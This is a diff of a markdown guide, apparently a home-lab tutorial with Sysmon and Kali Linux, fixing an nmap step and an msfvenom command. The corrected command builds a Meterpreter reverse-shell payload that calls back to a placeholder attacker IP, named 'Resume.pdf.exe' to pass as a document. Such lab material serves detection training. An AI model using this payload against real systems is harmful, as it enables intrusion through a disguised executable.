@@ -129,7 +129,7 @@ Get-Process sysmon64
 
 ## Step 5: Scanning for open port
 1. Open a terminal on the Kali Linux machine.  
-2. Scan port using using nmap.
+2. Scan port using nmap.
   - The following command will show nmap available options:
        ```bash
        nmap -h
@@ -144,7 +144,7 @@ Get-Process sysmon64
 ## Step 6: Creating malware using msfvenom
 **Generate Malware:** In a Kali terminal, execute the following command to create a reverse shell payload:
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcplhost=<Attacker_IP> lport=4444 -f exe -o Resume.pdf.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp Lhost=<Attacker_IP> Lport=4444 -f exe -o Resume.pdf.exe
 ```
   <img width="512" height="142" alt="malware" src="https://github.com/user-attachments/assets/1152858e-6c57-4f5e-a80e-1273af4bfe18" />
 
